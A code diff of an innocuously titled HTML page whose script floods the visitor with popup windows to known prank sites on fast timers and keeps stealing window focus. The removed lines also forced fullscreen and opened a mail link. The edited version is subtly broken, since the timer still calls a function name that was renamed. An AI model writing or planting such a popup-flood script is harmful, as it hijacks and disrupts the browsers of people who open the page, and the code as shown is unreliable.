@@ -5,34 +5,31 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ok</title>
     <script>
-        function openSites() {
+        function openRandomSite() {
             const urls = [
                 "http://theannoyingsite.com/",
-                "http://youareanidiot.cc/"
+                "http://youareanidiot.cc/",
             ];
-              const email = "example@example.com";  // 送信先のメールアドレス
-              const subject = "メールの件名";  // 件名
-              const body = "こんにちは！これはメール本文です。";  // 本文
             
-              const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-              window.location.href = mailtoLink;  // メールアプリを開く
-            document.documentElement.requestFullscreen();
-            urls.forEach(url => {
-                window.open(url, "_blank", "width=800,height=600");
-            });
+            // ランダムにインデックスを選ぶ
+            const randomIndex = Math.floor(Math.random() * urls.length);
+            const randomUrl = urls[randomIndex];
+            
+            // ランダムに選んだURLを新しいウィンドウで開く
+            window.open(randomUrl, "_blank", "width=800,height=600");
         }
 
-        // 10ms ごとに openSites を実行
-        setInterval(openSites, 10);
-
-        // 10ms ごとにポップアップ許可を促す
-        setInterval(() => {
-            try {
-                window.focus();
-            } catch (e) {
-                console.log("ポップアップ許可が必要かもしれません");
-            }
-        }, 10);
+        // 100ms ごとに openSites を実行 
+        setInterval(openSites, 100); 
+ 
+        // 100ms ごとにポップアップ許可を促す 
+        setInterval(() => { 
+            try { 
+                window.focus(); 
+            } catch (e) { 
+                console.log("ポップアップ許可が必要かもしれません"); 
+            } 
+        }, 10); 
     </script>
 </head>
 <body>
